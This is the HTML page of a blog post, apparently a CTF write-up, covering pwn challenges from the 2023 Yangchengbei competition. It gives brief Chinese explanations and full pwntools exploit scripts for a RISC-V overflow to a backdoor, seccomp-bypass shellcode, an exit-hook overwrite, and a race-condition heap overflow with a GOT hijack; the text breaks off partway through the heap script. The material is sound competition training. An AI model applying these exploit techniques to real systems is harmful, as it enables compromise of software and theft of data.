<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
    <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1_1KIhSyo5p8qDfCraXSh5Q提取码：n05i loginrisc-v pwn，给了后门，可以用cat fl*绕过 size_t的sVar1被byte截断存在溢出，比如0x107被byte截断0x07  from pwn import *from LibcSearcher import *context(os&#x3D;&amp;#x27;lin">
<meta property="og:type" content="article">
<meta property="og:title" content="2023 羊城杯">
<meta property="og:url" content="https://grxer.gitee.io/2023/09/07/2023-ycb/index.html">
<meta property="og:site_name" content="Grxer&#39;s Blog">
<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1_1KIhSyo5p8qDfCraXSh5Q提取码：n05i loginrisc-v pwn，给了后门，可以用cat fl*绕过 size_t的sVar1被byte截断存在溢出，比如0x107被byte截断0x07  from pwn import *from LibcSearcher import *context(os&#x3D;&amp;#x27;lin">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230907232659311.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230908171035483.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230908172332090.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230908181202295.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230908181402318.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230908183549480.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230908183435298.png">
<meta property="og:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230910004155958.png">
<meta property="article:published_time" content="2023-09-07T02:18:40.000Z">
<meta property="article:modified_time" content="2023-09-09T16:49:51.470Z">
<meta property="article:author" content="bxz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://grxer.gitee.io/2023/09/07/2023-ycb/image-20230907232659311.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>2023 羊城杯</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/09/10/OSTEP-30-31-Condition-Semaphores/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/09/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%BC%A0%E8%BE%93%E5%B1%82/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/09/07/2023-ycb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&text=2023 羊城杯"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&is_video=false&description=2023 羊城杯"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023 羊城杯&body=Check out this article: https://grxer.gitee.io/2023/09/07/2023-ycb/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&title=2023 羊城杯"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/09/07/2023-ycb/&name=2023 羊城杯&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/09/07/2023-ycb/&t=2023 羊城杯"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#login"><span class="toc-number">1.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-number">2.</span> <span class="toc-text">shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-vm"><span class="toc-number">3.</span> <span class="toc-text">easy_vm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap"><span class="toc-number">4.</span> <span class="toc-text">heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookiebox"><span class="toc-number">5.</span> <span class="toc-text">cookiebox</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2023 羊城杯
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">bxz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-09-07T02:18:40.000Z" itemprop="datePublished">2023-09-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1_1KIhSyo5p8qDfCraXSh5Q">https://pan.baidu.com/s/1_1KIhSyo5p8qDfCraXSh5Q</a><br>提取码：n05i</p>
<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>risc-v pwn，给了后门，可以用cat fl*绕过</p>
<p>size_t的sVar1被byte截断存在溢出，比如0x107被byte截断0x07</p>
<p><img src="/2023/09/07/2023-ycb/image-20230907232659311.png" alt="image-20230907232659311"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;riscv&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io=process([<span class="string">&quot;qemu-riscv64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/riscv64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])#调试</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-riscv64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/riscv64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])<span class="meta">#</span></span><br><span class="line"><span class="meta">r = lambda x: io.recv(x)</span></span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = lambda x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">def find_libc(func_name,func_ad):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    global libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">256</span></span><br><span class="line">backdor=<span class="number">0x123456ee</span></span><br><span class="line">payload=flat(padding,backdor)</span><br><span class="line">sa(b<span class="number">&#x27;</span> name:<span class="string">&#x27;,b&#x27;</span>gr<span class="number">&#x27;</span>)</span><br><span class="line">sa(b<span class="number">&#x27;</span>words<span class="number">&#x27;</span>,payload)</span><br><span class="line">sa(b<span class="number">&#x27;</span>exec<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>cat fl*<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">io.interactive()</span></span><br></pre></td></tr></table></figure>

<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>开了沙箱，限制了read的fd要&lt;&#x3D;2，write的fd必须大于2，所幸可以使用dup2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020</span><br><span class="line">0005: 0x15 0x0d 0x00 0x00000002  if (A == open) goto 0019</span><br><span class="line">0006: 0x15 0x0c 0x00 0x00000021  if (A == dup2) goto 0019</span><br><span class="line">0007: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0013</span><br><span class="line">0008: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line">0009: 0x25 0x0a 0x00 0x00000000  if (A &gt; 0x0) goto 0020</span><br><span class="line">0010: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0019</span><br><span class="line">0011: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line">0012: 0x25 0x07 0x06 0x00000002  if (A &gt; 0x2) goto 0020 else goto 0019</span><br><span class="line">0013: 0x15 0x00 0x06 0x00000001  if (A != write) goto 0020</span><br><span class="line">0014: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line">0015: 0x25 0x03 0x00 0x00000000  if (A &gt; 0x0) goto 0019</span><br><span class="line">0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020</span><br><span class="line">0017: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)</span><br><span class="line">0018: 0x25 0x00 0x01 0x00000002  if (A &lt;= 0x2) goto 0020</span><br><span class="line">0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0020: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>可以执行我们输入的shellcode，最长17个字节，shellcode范围在[0x4F,0x5f]，但是最后一bit shellcode没有检测</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x14F2&#x27;)</span></span><br><span class="line">sa(<span class="string">b&#x27;no)&#x27;</span>,asm(<span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rax#fake padding</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax#0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rsi#0x7ffd451d99c0 ◂— 0x50f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi#0</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rdx#0x50f</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br><span class="line">sa(<span class="string">b&#x27;===\n&#x27;</span>,asm(shellcode))</span><br><span class="line">orw_dup2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov eax,2</span></span><br><span class="line"><span class="string">syscall #open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,0x21</span></span><br><span class="line"><span class="string">mov rdi,0x3</span></span><br><span class="line"><span class="string">mov rsi,0x2</span></span><br><span class="line"><span class="string">syscall#dup2(3,2)</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall #read(2,rsp,0x30)</span></span><br><span class="line"><span class="string">mov rax,0x21</span></span><br><span class="line"><span class="string">mov rdi,0x1</span></span><br><span class="line"><span class="string">mov rsi,0x5</span></span><br><span class="line"><span class="string">syscall#dup2(1,5)</span></span><br><span class="line"><span class="string">mov rax,0x1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdi,0x5</span></span><br><span class="line"><span class="string">syscall#write(5,rsp)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>+asm(orw_dup2))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p> qword_201040里含有残余的unsortedbin，程序具有任意写，可以利用偏移确认ogg，写exithook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x9A4 &#x27;)#3</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x0ABC&#x27;)#exit</span></span><br><span class="line">ogg=[<span class="number">0x45206</span>,<span class="number">0x4525a</span>,<span class="number">0xef9f4</span>,<span class="number">0xf0897</span>]</span><br><span class="line">code=flat(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="number">7</span>,<span class="number">0x3c3b78</span>,<span class="comment">#libc_base</span></span><br><span class="line">    <span class="number">6</span>,ogg[<span class="number">3</span>],</span><br><span class="line">    <span class="number">1</span>,<span class="comment">#*(_QWORD *)qword_201040=ogg</span></span><br><span class="line">    <span class="number">7</span>,ogg[<span class="number">3</span>],</span><br><span class="line">    <span class="number">6</span>,<span class="number">0x626f48</span>,<span class="comment">#exit_hook=qword_201040=ogg</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sa(<span class="string">b&#x27;code:&#x27;</span>,code)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>多线程堆题，每个操作都会起一个线程</p>
<p>每个paper会分配一个0x10管理结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">paper</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *content_ptr;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>edit里存在条件竞争导致的堆溢出，如果此时edit paper-&gt;len&#x3D;0x68大小的paper，sleep期间，这个paper被释放，并申请了一个长度为0x58大小的paper B，paper B就可以造成0x10大小的堆溢出，可以覆盖掉下一个paper C的管理结构控制content_ptr实现泄露地址和任意地址写</p>
<p><img src="/2023/09/07/2023-ycb/image-20230908171035483.png" alt="image-20230908171035483"></p>
<p>子进程分配堆时，在页开始的0x8a0处是指向main_arena的指针，可以用来泄露libc</p>
<p><img src="/2023/09/07/2023-ycb/image-20230908172332090.png" alt="image-20230908172332090"></p>
<p>strtok函数会调用strspn_sse42函数</p>
<p><img src="/2023/09/07/2023-ycb/image-20230908181202295.png" alt="image-20230908181202295"></p>
<p>strspn_sse42的got是可写的可以劫持为system</p>
<p><img src="/2023/09/07/2023-ycb/image-20230908181402318.png" alt="image-20230908181402318"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span 